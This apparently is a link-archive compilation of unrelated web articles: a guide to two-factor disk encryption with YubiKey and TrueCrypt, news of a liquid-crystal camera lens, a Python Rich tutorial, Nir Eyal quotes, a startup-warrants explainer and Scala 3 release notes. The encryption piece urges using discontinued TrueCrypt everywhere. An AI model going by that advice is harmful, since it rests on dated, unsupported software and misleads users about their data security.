<em><a href="https://en.wikipedia.org/wiki/Rubber-hose_cryptanalysis">Rubber-hose cryptanalysis</a> from <a href="https://xkcd.com/538/">xkcd</a></em></p>
<p>To prevent being compelled to reveal your passwords, somebody invented <a href="https://en.wikipedia.org/wiki/Deniable_encryption">Deniable Encryption</a>. Basically you have two passwords: when you enter the first one the information decrypted is different than when you enter the second one. You use your device with the second password to work on the sensitive information (which can’t be accessed using the first password). In case somebody threatens you, you give them the first password. They will decrypt your device and see that there is no information (or if there is, info that is not sensitive).</p>
<p>In practice Plausible Deniability is problematic:</p>
<ul>
<li>
<p>Tools and techniques exist to detect the presence of a secondary password (Deniable Encryption).</p>
</li>
<li>
<p>If your attacker sees that the system can use plausible deniability, they may not believe that there is only one password and therefore may continue to threaten you until you reveal the second one.</p>
</li>
<li>
<p>It will be harder for you to pass lie detection tests since you are still able to access the sensitive information using a secondary password.</p>
</li>
</ul>
<p>What you really want, if threatened, is not to be physically able to unlock your device. If you can’t decrypt the information, nobody has a reason to threaten you.</p>
<h2 id="two-factor-encryption">Two Factor Encryption</h2>
<p>Two Factor Encryption uses your password in addition to something you possess to generate the encryption key of your device. In general these secondary factors look like USB keys. To decrypt the information, you need your password (50% of the key) and some information you don’t know, stored/calculated by your secondary factor (the other 50% of the key).</p>
<p>You can’t open your device without these two elements: your password and the secondary factor.</p>
<p>The beautiful thing is that if you break the secondary factor, you won’t be able to access your device and its backups. You can’t be compelled to decrypt the information, because you simply can’t: your password, which you can now freely communicate to your attacker, will not be enough.</p>
<p><strong>Using Two Factor Encryption creates a physical “red button” which, if pressed, will destroy all access to the information in your devices (even offline backups stored in different locations).</strong></p>
<p>This also has the side effect of preventing you from accessing your device’s information ever again. This is one disadvantage of Two Factor Encryption over Plausible Deniability, which is that you can’t access your data after the attacker is done with you. However if you’re handling sensitive information, it is very likely that you’d rather have it destroyed than letting it fall into the wrong hands.</p>
<h2 id="yubikey">YubiKey</h2>
<p><img src="https://www.alvarez.io/img/color/2FE-2.png" alt="YubiKey"></p>
<p>A nice, affordable second factor for your encryption is a <a href="https://www.yubico.com/">YubiKey</a>. However there is no straightforward manual on how to use it, and the key has quite complex modes and functionalities.</p>
<p>If you are not a technical person, I will recommend using the <a href="https://support.yubico.com/hc/en-us/articles/360016614980-Understanding-Core-Static-Password-Features">password mode</a>. It is not as safe as the challenge mode, but it will be simpler to use and to configure.</p>
<p><strong>Password Mode</strong></p>
<p>The YubiKey can act as a usb keyboard. When the button is pressed, it will send a combination of keys (a kind of password) as if someone was typing. This makes it compatible with everything that requires a typed password. However using this mode implies that the 50% of the key coming from your 2FE will be the same across all devices. If it is intercepted it will drastically reduce the security.</p>
<p>To use the password mode, when prompted to your login information, enter your password (the thing you know), then plug your YubiKey and press the button. It will “type” the rest of the “password” (the thing you possess but don’t know). You can then access your device.</p>
<p>In this scenario the thing you know is 50% of the password, the other 50% of it (which you don’t know) is stored on your YubiKey and typed for you when you press the button.</p>
<p><strong>Challenge Mode</strong></p>
<p>The challenge mode is safer than the password mode, however it is more complex to configure and use. The information received from the YubiKey (the 50% of the key that comes from the 2FE) is different for each device. If it is intercepted, it will not compromise the security of other devices.</p>
<p>To use the challenge mode, your encryption software has to be compatible with it (contrary to the password mode which works with everything). When prompted to your login information, enter your password, and then the software will send a challenge (a phrase or an id you pre-configured) to the YubiKey which will respond with the missing 50% of the encryption key. The combination of the two elements (your password and the 2FE response), creating the encryption key, will unlock your device.</p>
<p>The advantage of the challenge mode is that if you configure a different challenge (phrase or id) for each device you will have a different response each time, making your encryption key unique on all your devices and backups. This increases the security a lot in case one of them is compromised.</p>
<h2 id="not-all-encryptions-are-made-equal">Not All Encryptions Are Made Equal</h2>
<p>Cryptography may be the hardest thing in security. If you screw it up, nobody will come and tell you about it, and  you will pay the consequences later on.</p>
<p><strong>Serpent Encryption Algorithm</strong></p>
<p><a href="https://en.wikipedia.org/wiki/Serpent_(cipher)">Serpent</a> was part of the finalists of the <a href="https://en.wikipedia.org/wiki/Advanced_Encryption_Standard_process">AES competition</a>. It was judged to be the most secure algorithm of them all, but <a href="https://www.schneier.com/wp-content/uploads/2016/02/paper-twofish-final.pdf">was discarded due to its speed</a>. However 20 years later, the computational power of everything exploded. Today the difference in speed between AES and Serpent doesn’t matter anymore, however the  difference in security still does. This is part of the reason why you should use Serpent everywhere ;)</p>
<p><strong>Truecrypt</strong></p>
<p>Truecrypt is an awesome tool that has been proved to be <a href="https://en.wikipedia.org/wiki/TrueCrypt#Legal_cases">complicated to break</a>. The tool was suddenly discontinued in 2014 in what seemed to be due to <a href="https://www.reddit.com/r/sysadmin/comments/26pxol/truecrypt_is_dead/">third party pressure</a>. An independent audit was financed by the <a href="https://www.opencryptoaudit.org/">community</a> in 2013. The <a href="https://opencryptoaudit.org/reports/TrueCrypt_Phase_II_NCC_OCAP_final.pdf">summary</a> was released in 2015, showing “no evidence of deliberate backdoors, or any severe design flaws that will make the software insecure in most instances”.</p>
<p>Given that it’s complicated/impossible to break, that it’s been audited without any security flaw found, and the pressure put on the developers to stop the project: <strong>it’s safe to say that you should use it everywhere</strong>.</p>
<p>You can find Truecrypt <a href="https://github.com/DrWhax/truecrypt-archive">here</a>, the last version is 7.1a. Use the 3 ciphers cascade encryption mode.</p>
<p>If you use the hidden volume feature, be careful with older backup versions of your file container. The difference between the older version of the container and the newer version will reveal the use of an hidden volume (bytes will change where there is supposedly no data). Try to backup the content of your container inside a new one, so  that there is no match at all between the backups and the original container.</p>
<p><strong>Password</strong></p>
<p>The last line of defense for your data is your password. Depending on the system you are using, the encryption key will be encrypted using your password, or …</p></div></div>

That's because the cameras in smartphones are&nbsp;unable to replicate the physical movement of an adjustable lens as seen with digital single-lens reflex (DSLR) cameras.&nbsp;</p>  <p>This physical manipulation lens still relies on 16th century Galilean optics, an archaic system that has not been reimagined — until now. Scope CEO Holden Beggs says the new technology the team has come up with has modernized the current lens system. It&nbsp;applies electrical fields to liquid crystals enabling a high quality zoomed image without any physical movement.&nbsp;</p>  <p>"If you think about whenever you try to take a photo, especially when you want to zoom in and take a photo, when you pinch the zoom, that photo gets blurry, it gets pixilated; and it's because all your phone is essentially doing is using software that just crops the photo, it's not actually keeping that high quality," Beggs told CBC News.</p>  <p>"What our technology means is you'll be able to zoom to take consistently sharp photos, it means you'll be able to take different kinds of photos … and you can do it without having a bunch of cameras on the back of your phone, just one that can do everything."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/scope.jpg 300w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/scope.jpg 460w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/scope.jpg 620w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg 780w,https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/scope.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5808073.1605800706!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg"></p></div><figcaption>Scope CEO Holden Beggs says the new technology has modernized the current lens system and applies electrical fields to liquid crystals enabling a high quality zoomed image without any physical movement. <!-- --> <!-- -->(Dyson Canada Ltd.)</figcaption></figure></span></p>  <h2>'Impressive invention'</h2>  <p>Explaining how the Scope lens works, Beggs said when different fields are applied, the crystals reorient and change shape, mimicking a physical zoom system — a perfect integration and replacement of current smartphone lenses.</p>  <p>"It's a great invention because it solves a problem that has really been plaguing optics and cameras," he said.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/scope.jpg 300w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/scope.jpg 460w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/scope.jpg 620w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg 780w,https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/scope.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5808070.1605800590!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/scope.jpg"></p></div><figcaption>UW’s engineering team surpassed more than 1,800 international applicants in 27 countries with their invention.<!-- --> <!-- -->(Dyson Canada Ltd.)</figcaption></figure></span></p>  <p>The students recently won the international runner up prize and $8,500 for the James Dyson Award (JDA), a global annual design competition to encourage students to engineer inventions to some of the world's largest problems.&nbsp;</p>  <p>UW's engineering team beat out more than 1,800 international applicants in 27 countries with their invention.</p>  <p>Peter Gammack, Dyson's vice president of new product innovation, called Scope "an impressive invention" in a release.</p>  <p>"Not only is it a low compact and cost-effective solution, it also has the potential to be used in a variety&nbsp;of product applications.

<p>This is the default <a href="https://github.com/willmcgugan/rich/blob/master/rich/logging.py#L15">RichHandler</a> class in <a href="https://github.com/willmcgugan/rich">Rich</a>. It would be possible to do a little more customization for Django logs. Maybe highlight 5xx in red, for example.</p>
<p>To add this to your Django project, <code>pip install rich</code> then configure the console to use <code>"rich.logging.RichHandler"</code> rather than StreamHandler.</p>
<pre><code>LOGGING = {
    "version": 1,
    "disable_existing_loggers": False,
    "formatters": {"rich": {"datefmt": "[%X]"}},
    "handlers": {
        "console": {
            "class": "rich.logging.RichHandler",
            "formatter": "rich",
            "level": "DEBUG",
        }
    },
    "loggers": {"django": {"handlers": ["console"]}},
}
</code></pre>
<p>The process is much the same for any project. See the documentation for the Rich <a href="https://rich.readthedocs.io/en/latest/logging.html">logging handler</a> for details.</p>

November 20, 2020 | https://jslvtr.com/posts/better-python-console-apps-with-rich | <a href="https://web.archive.org/web/*/https://jslvtr.com/posts/better-python-console-apps-with-rich">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Recently I've been working on a few internal tools for my company, Teclado. Things like web scrapers to collect data and store it in a database, or simple tools to make people's jobs easier.</p>
<p>Because these are intended for a very small audience who are doing very specific tasks, I normally make console applications. And console applications can be tricky to use (and look hideous) most of the time.</p>
<p><strong>Rich</strong> is a Python library that changes that completely. My new console apps are a joy to use, look great, and it's super easy to create them.</p>
<p>In this post, let me tell you about Rich and how I've been using it. I'm not a Rich expert by any means, but I hope it helps!</p>
<h2>A Rich Example</h2>
<p>The <a href="https://rich.readthedocs.io/en/latest/introduction.html">Rich documentation</a> is excellent, so I'll just give you a quick example of the sorts of things you can do with it.</p>
<pre><code><span>from</span> rich <span>import</span> <span>print</span>
<span>from</span> rich.prompt <span>import</span> Prompt

name = Prompt.ask(
    <span>"What is your name?"</span>,
    choices=[<span>"Jose"</span>, <span>"Adam"</span>, <span>"Jen"</span>]
)

helped = <span>50</span>  
print(<span>f"You have helped [bold green]<span>{helped}</span>[/] students this week! :muscle:"</span>)</code></pre>
<p>The output of this code is this:</p>
<p><img src="https://jslvtr.com/images/better-python-console-apps-with-rich/prompting.gif" alt="Terminal demo of the Prompt code"></p>
<p>Sadly, Windows support for emojis in the terminal is extremely subpar. It works well on Mac, though!</p>
<p>You can see that Rich does a lot for you already, such as limiting choices in prompts, or support for colours and styles in text using a BBCode-like syntax.</p>
<p>There's more though!</p>
<h2>Tables with Rich</h2>
<p>By far one of my favourite features of Rich is <em>Tables</em>. I'm using tables for all sorts of stuff in my console apps, and I find myself doing the same pattern over and over:</p>
<ul>
<li>Clear the console</li>
<li>Add a table row</li>
<li>Draw the table</li>
</ul>
<p>With this pattern, tables can look like they're growing over time, effectively making your console window into a standalone app.</p>
<p><img src="https://jslvtr.com/images/better-python-console-apps-with-rich/tables-demo.gif" alt="Terminal demo of growing tables"></p>
<p>For example, recently I was writing a scraper for house prices nearby (I'm thinking of moving), and I naturally wanted to display the house information, price, and so forth. Nothing better than a table for this, so I got to writing:</p>
<pre><code><span>import</span> requests
<span>from</span> bs4 <span>import</span> BeautifulSoup
<span>from</span> rich.console <span>import</span> Console
<span>from</span> rich.table <span>import</span> Table

console = Console()
page = requests.get(RIGHTMOVE_URL).content
soup = BeautifulSoup(page)


property_table = Table()
property_table.add_column(<span>"Address"</span>, style=<span>"bold"</span>)
property_table.add_column(<span>"Rooms"</span>)
property_table.add_column(<span>"Price"</span>)

<span>for</span> property <span>in</span> properties:
    property_table.add_row(property[<span>0</span>], str(property[<span>1</span>]), str(property[<span>2</span>]))

console.print(property_table)</code></pre>
<p>That's how easy it is to draw a table using Rich! It doesn't have dynamic growing, but all you have to do to make a table grow dynamically is clear the console and re-create the table each time, with increasing numbers of rows.</p>
<p>That could be particularly useful if we had to scrape each property's page to get more information. If we did that, the table could grow as we scrape, which would be awesome!</p>
<h2>Adapting Classes to Rich</h2>
<p>Another great thing about Rich (especially if you're making applications that specifically output to a Rich <code>Console</code>), is that your classes can become <code>Renderable</code>. Then you can just print them, and Rich will display them in the format you choose.</p>
<p>For example, you could make a class like this one:</p>
<pre><code><span>from</span> rich.console <span>import</span> Console, ConsoleOptions, RenderResult
<span>from</span> rich.table <span>import</span> Table


<span><span>class</span> <span>PropertyTable</span>:</span>
    <span><span>def</span> <span>__init__</span>(<span>self</span>):</span>
        self._properties = []

    <span><span>def</span> <span>__len__</span>(<span>self</span>):</span>
        <span>return</span> len(self._properties)

    <span><span>def</span> <span>append</span>(<span>self, prop</span>):</span>
        self._properties.append(prop)

    <span><span>def</span> <span>pop</span>(<span>self</span>):</span>
        <span>return</span> self._properties.pop()

    <span><span>def</span> <span>clear</span>(<span>self</span>):</span>
        self._properties.clear()

    <span><span>def</span> <span>__rich_console__</span>(<span>self, console: Console, options: ConsoleOptions</span>) -&gt; RenderResult:</span>
        properties = Table(expand=<span>True</span>)
        properties.add_column(<span>"Address"</span>)
        properties.add_column(<span>"Rooms"</span>, style=<span>"bold"</span>)
        properties.add_column(<span>"Price"</span>, style=<span>"bold green"</span>)

        <span>for</span> prop <span>in</span> self._properties:
            prop.add_row(prop[<span>0</span>], str(prop[<span>1</span>]), str(prop[<span>2</span>]))

        <span>yield</span> properties</code></pre>
<p>And when printed using a Rich <code>Console</code>, that shows a table with a row per item in the <code>_properties</code> list.</p>
<h2>Better Logging and Tracebacks with Rich</h2>
<p>Rich can do many other things for you, but another good one is that it can make it easier to read tracebacks and errors. Just do this:</p>
<pre><code><span>from</span> rich.traceback <span>import</span> install
install()</code></pre>
<p>And from then on, your tracebacks will look like this:</p>
<p><img src="https://github.com/willmcgugan/rich/raw/master/imgs/traceback.png" alt="Screenshot of Rich tracebacks"></p>
<p>Image taken directly from the <a href="https://github.com/willmcgugan/rich">Rich GitHub page</a> (which by the way, is great).</p>
<h2>Conclusion</h2>
<p>If you make console apps, as most of us Python developers do, I really recommend installing and using Rich! It'll make your apps easier to code and use.</p>
<p>Thank you for reading!</p>

<h4>About Nir Eyal</h4>



<p>Nir Eyal is an Israeli-born American author, lecturer, and investor.  Previously, he taught as a Lecturer in Marketing at the Stanford Graduate School of Business and Design School and I’ve sold two technology companies since 2003. </p>



<p>Nir Eyal is the bestselling author of <a href="https://www.amazon.com/gp/product/1591847788/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=motiveex-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=1591847788&amp;linkId=efb3c5480d3cd5d001553869edce302c"><em>Hooked: How to Build Habit-Forming Products</em></a> and <a href="https://www.amazon.com/gp/product/194883653X/ref=as_li_qf_asin_il_tl?ie=UTF8&amp;tag=motiveex-20&amp;creative=9325&amp;linkCode=as2&amp;creativeASIN=194883653X&amp;linkId=4e87049bcf3c51d2ef9828baac46fd9b"><em>Indistractable: How to Control Your Attention and Choose Your Life</em></a>. </p>



<p>Years of studying successful startups led to insights about influencing consumer behavior. And then, these insights were codified in the Hook model: a cycle of events, engineered to keep users coming back. </p>



<p> Hooked is ideal for businesses that build products that require ongoing, unprompted user engagement, and therefore need to build user habits within the product to thrive. It is a perfect read for startup founders, visionaries, innovators, but also established corporations who aim to understand how products influence our behavior and use habits for good.

<h4>Nir Eyal Quotes</h4>



<p>Here are the most powerful success lessons from the Nir Eyal quotes:</p>



<blockquote><p>Users who continually find value in a product are more likely to tell their friends about it.</p><cite><strong> Nir Eyal </strong></cite></blockquote>



<blockquote><p>Many innovations fail because consumers irrationally overvalue the old while companies irrationally overvalue the new.</p><cite><strong> Nir Eyal </strong></cite></blockquote>



<blockquote><p>Products that require a high degree of behavior change are doomed to fail.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>To change behavior, products must ensure the user feels in control. People must want to use the service, not feel they have to.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>The Hook Model is designed to connect the user’s problem with the designer’s solution frequently enough to form a habit. It is a framework for building products that solve user needs through long-term engagement.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>Make your product so simple that users already know how to use it, and you’ve got a winner.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>Companies who form strong user habits enjoy several benefits to their bottom line.</p><cite> <strong> Nir Eyal </strong> </cite></blockquote>



<blockquote><p>the first place for the entrepreneur or designer to look for new opportunities is in the mirror.</p><cite><strong>Nir Eyal </strong> </cite></blockquote>



<blockquote><p>Fun is looking for the variability in something other people don’t notice. It’s breaking through the boredom and monotony to discover its hidden beauty.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>For some businesses, forming habits is a critical component to success, but not every business requires habitual user engagement.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Instead of relying on expensive marketing, habit-forming companies link their services to the users’ daily routines and emotions.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>When users start to automatically cue their next behavior, the new habit becomes part of their everyday routine.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>The ultimate goal of a habit-forming product is to solve the user’s pain by creating an association so that the user identifies the company’s product or service as the source of relief.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>there are three ingredients required to initiate any and all behaviors: (1) the user must have sufficient motivation; (2) the user must have the ability to complete the desired action; and (3) a trigger must be present to activate the behavior.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>“Habit Testing.” It is a process inspired by the build-measure-learn methodology championed by the lean startup movement. Habit Testing offers insights and actionable data to inform the design of habit-forming products. It helps clarify who your devotees are, what parts of your product are habit-forming (if any), and why those aspects of your product are changing user behavior.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Internet is, “a giant machine designed to give people what they want.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Habit-forming products often start as nice-to-haves (vitamins) but once the habit is formed, they become must-haves (painkillers).</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>For an infrequent action to become a habit, the user must perceive a high degree of utility, either from gaining pleasure or avoiding pain. </p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>So why haven’t more Google users switched to Bing? Habits keep users loyal. If a user is familiar with the Google interface, switching to Bing requires cognitive effort. Although many aspects of Bing are similar to Google, even a slight change in pixel placement forces the would-be user to learn a new way of interacting with the site. Adapting to the differences in the Bing interface is what actually slows down regular Google users and makes Bing feel inferior, not the technology itself.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>We often think the Internet enables you to do new things … But people just want to do the same things they’ve always done.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Users take their technologies with them to bed.[cxiv] When they wake up, they check for notifications, tweets, and updates, sometimes even before saying “Good morning” to their loved ones.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Once a technology has created an association in users’ minds that the product is the solution of choice, they return on their own, no longer needing prompts from external triggers.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Variable rewards are one of the most powerful tools companies implement to hook users</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<pre></pre>



<blockquote><p>You are now equipped to use the Hook Model to ask yourself these five fundamental questions for building effective hooks:   1.   What do users really want? What pain is your product relieving? (Internal Trigger) 2.   What brings users to your service? (External Trigger) 3.   What is the simplest action users take in anticipation of reward, and how can you simplify your product to make this action easier? (Action) 4.   Are users fulfilled by the reward, yet left wanting more? (Variable Reward) 5.   What “bit of work” do users invest in your product? Does it load the next trigger and store value to improve the product with use? (Investment)</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Who is on a team matters less than how the team members interact, structure their work, and view their contributions.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>To receive fewer emails, we must send fewer emails.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>There are many counterintuitive and surprising ways companies can boost users’ motivation or increase their ability by understanding heuristics—the mental shortcuts we take to make decisions and form opinions.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>If you were to walk around Slack’s company headquarters in San Francisco, you’d notice a peculiar slogan on the hallway walls. White letters on a bright pink background blare, “Work hard and go home.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>The goal is to eliminate all white space on your calendar so you’re left with a template for how you intend to spend your time each day.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Motivation or Ability — Which Should You Increase First? After uncovering the triggers that prompt user actions and deciding which actions you want to turn into habits, you can increase motivation and ability to spark the likelihood of your users taking a desired behavior. But which should you invest in first, motivation or ability? Where is your time and <a href="https://motiveex.com/tag/wealth/">money</a> better spent? The answer is always to start with ability.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Building habit-forming products is an iterative process and requires user behavior analysis and continuous experimentation.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>However, products utilizing infinite variability stand a better chance of holding on to users’ attention, while those with finite variability must constantly reinvent themselves just to keep pace.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Many entrepreneurs fall into the trap of building products that are only marginally better than existing solutions, hoping their innovation will be good enough to woo customers away from existing products. But when it comes to shaking consumers’ old habits, these naive entrepreneurs often find that better products don’t always win—especially if a large number of users have already adopted a competing product.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>



<blockquote><p>Companies fail to change user behaviors because they do not make their services enjoyable for its own sake, often asking users to learn new, unfamiliar actions instead of making old routines easier.</p><cite> <strong>Nir Eyal </strong>  </cite></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-ix="fade-in-blog-post" id="continue-reading" data-w-id="090c74fd-0c24-ef76-0192-8c569ddeea91"><div><div data-ix="hide-blog-content-block" id="read-post"><div><div><p>We don't usually post new content on Friday's but with the launch of the new site (thanks <a href="https://webflow.com/">Webflow</a>!) we figured let's take this thing for a test drive. One thing that I know confused me as a first time founder trying to raise capital from investors for the first time was when someone mentioned to me that they would want a warrant in the deal. Warrants can sound intimidating but as you know here at Talkin' SaaSy we like to try and break things down so they are more digestible so let's get into warrants, long story short, an IOU for investors.</p><p>Early-stage investing is speculative and risky business. More often than not angels or early-stage funds are taking bet on founder they believe in that are working on a product or solution to a problem that they believe will have broad market application. Now early-stage investors protect themselves from this risky business, first is diversification of their portfolio, more promising startups means you are more likely to have a few winners in your portfolio (in theory). Second is warrant coverage, how exactly does this help?</p><p>Warrants are essentially an IOU from a company to an investor as part of a funding round. Say I put $250,000 into a seed round of your budding SaaS startup at $1.00 a share. For early-stage investing like this, a fund or angel is counting on that price per share multiplying many times, if it goes to $40.00 per share, my $250,000 is now $40M, sounds like a nice return, right?. Well my seed fund is a $50M fund which means even if i hit one company that goes from 1 to 40 dollar per share, I'm still $10M short on breaking even with my fund, yikes. This is where warrants come in, for those early-stage investors, maximizing the number of shares you can get in your winners is a key for driving fund performance.</p><p>So now, in that same seed round, I included a warrant for 20% of the round meaning the company, if I exercise the warrant. Must sell me and additional $50,000 shares at a strike price (a strike price is just a set price that is agreed upon in the warrant, it means the investors get to buy shares of the stock at the set strike price, no matter what the actual price is in the most recent funding round). So, with my 20% warrant, I am entitled to purchase an additional $50,000 worth of shares at a $2.00 strike price. So if that same company goes to $40.00 a share and I exercise my warrant I turn my $50,000 into an extra $1,000,000, as an investor I just got much closer to returning my fund and I haven't even take into account pro-rata right (we will get into that another time).</p><p>Warrants on their surface are meant to help companies looking to raise capital. In theory, the investor is incentivized to help the business do better and thus the warrant becomes more valuable. The issue is, most early-stage funds typically have warrants in all of their deals, so no matter which deal wins, they get to leverage that warrant into great ROI for the fund. How could we rethink warrants to better align outcomes and incentivize investors to help startup succeed?&nbsp;Is it a sliding performance scale?&nbsp;The better the startup grows and performs the better the terms of the warrant are for investors? It will be interesting to see if we can rethink how we use warrants to help align the outcome for founders and investors. Disclosure, warrants are used in multiple types of investing and this article is only meant to summarize their use in private venture investing. This is also a very simplified summary of warrants, if you are using a warrant in a funding round always comply with securities law and consulte a legal professional.</p></div></div></div></div></div></div>]]>

November 20, 2020 | https://dotty.epfl.ch/blog/2020/11/09/scala3-m1.html | <a href="https://web.archive.org/web/*/https://dotty.epfl.ch/blog/2020/11/09/scala3-m1.html">archive.org</a>

    </header>

    <p>November 2020 brings an important milestone for Scala 3 – the release of Scala 3.0.0-M1. This milestone release is a precursor to the Scala 3.0.0 release candidate planned for the end of the year – which is as little as 6 weeks from now! Later on, the release candidate is planned to evolve into 3.0.0 stable release in February 2021.</p>
<p>Once 3.0.0 release candidate is out, no new features or breaking changes will take place on 3.0.x – it will only be updated for bug fixes. However, we are going to continue the work on making the language better and to test out our research in it. These changes will end up in Scala only as of 3.1.0.</p>
<p>For now though, our teams are focusing the efforts on getting done with the remainder of the 40-something projects that we planned for the upcoming release back in July 2020. Many of them are already completed. Those that aren't yet – get revised and re-planned. With the current global uncertainty and with the scale of the project, we cannot be certain, but we believe we have a reasonable chance of releasing 3.0.0-RC1 by Christmas.</p>
<p>Below, you can find a short summary of the changes that took place during between the 0.27.0-RC1 and 3.0.0-M1 releases.</p>
<!--more-->

<p>Dotty 0.27.0-RC1 had introduced preliminary Scala.js support with the portable subset of Scala and native JavaScript types.
Scala 3.0.0-M1 significantly expands on that support:</p>
<ul>
<li>support for non-native JS types (<a href="https://github.com/lampepfl/dotty/pull/9774">#9774</a>), and</li>
<li>better support for other JS interop features, notably their interactions with Scala 3 features such as top-level declarations and <code>enum</code>s (e.g, <a href="https://github.com/lampepfl/dotty/pull/9725">#9725</a> and <a href="https://github.com/lampepfl/dotty/pull/9955">#9955</a>).</li>
</ul>
<p>The only remaining feature of Scala.js that is not supported yet is JS exports: <code>@JSExport</code> and its siblings <code>@JSExportAll</code>, <code>@JSExportTopLevel</code> and <code>@JSExportStatic</code> are all ignored by Scala 3.0.0-M1.
Support for JS exports will come in the next release.</p>
<p>For related reading, you can learn more on what it took to <a href="https://www.scala-lang.org/2020/11/03/scalajs-for-scala-3.html">implement Scala.js support in Scala 3 on our blog</a>.</p>

<p>As the title suggests, this change is fairly straightforward. Now, instead of:</p>
<pre><code>x match {
  case Foo(y @ Bar(z)) =&gt; println(y)
}
</code></pre>
<p>You can write:</p>
<pre><code>x match {
  case Foo(y as Bar(z)) =&gt; println(y)
}
</code></pre>
<p>As of Scala 3.1.0, the <code>@</code> syntax will be deprecated and the codebases should switch to <code>as</code> instead.</p>
<p>This change was implemented by PR <a href="https://github.com/lampepfl/dotty/pull/9837">#9837</a>.</p>

<p>The syntax for <code>given</code> instances in patterns has also changed. In the <code>for</code>-comprehensions, the correct way of using <code>given</code>s is as follows:</p>
<pre><code>for given Context &lt;- applicationContexts do
</code></pre>
<p>And in <code>match</code> clauses, you can use them as follows:</p>
<pre><code>pair match
  case (ctx as given Context, y) =&gt; ...
</code></pre>
<p>For more information, see <a href="https://dotty.epfl.ch/docs/reference/contextual/givens.html#pattern-bound-given-instances">documentation</a>, and for discussion, see PR <a href="https://github.com/lampepfl/dotty/pull/10091">#10091</a>.</p>

<p>This is another syntactic change which aims to simplify the code. Instead of:</p>
<pre><code>import p.{given _}
</code></pre>
<p>The correct version of the wildcard <code>given</code> import now becomes:</p>
<pre><code>import p.given
</code></pre>
<p>This change was implemented by PR <a href="https://github.com/lampepfl/dotty/pull/9949">#9949</a>.</p>

<p><code>enum</code> definitions are now released in their final design. since <code>0.27.0-RC1</code> we have made the following changes:</p>
<p>For the enum definition of Option:</p>
<pre><code>enum Opt[+T] {
  case Sm(value: T)
  case Nn
}
</code></pre>
<p>we will now generate on the companion objects of class cases <code>apply</code> and <code>copy</code> methods with the precise subtype:</p>
<pre><code>object Sm {
  ...
  def apply[T](value: T): Sm[T]
  ...
}
</code></pre>
<p>however expressions that call <code>apply</code> or <code>copy</code> will be widened to the parent enum type unless the precise type is expected, as we see here:</p>
<pre><code>scala&gt; Sm(23)
val res0: Opt[Int] = Sm(23)

scala&gt; val sm: Sm[23] = Sm(23)
val sm: Opt.Sm[23] = Sm(23)
</code></pre>
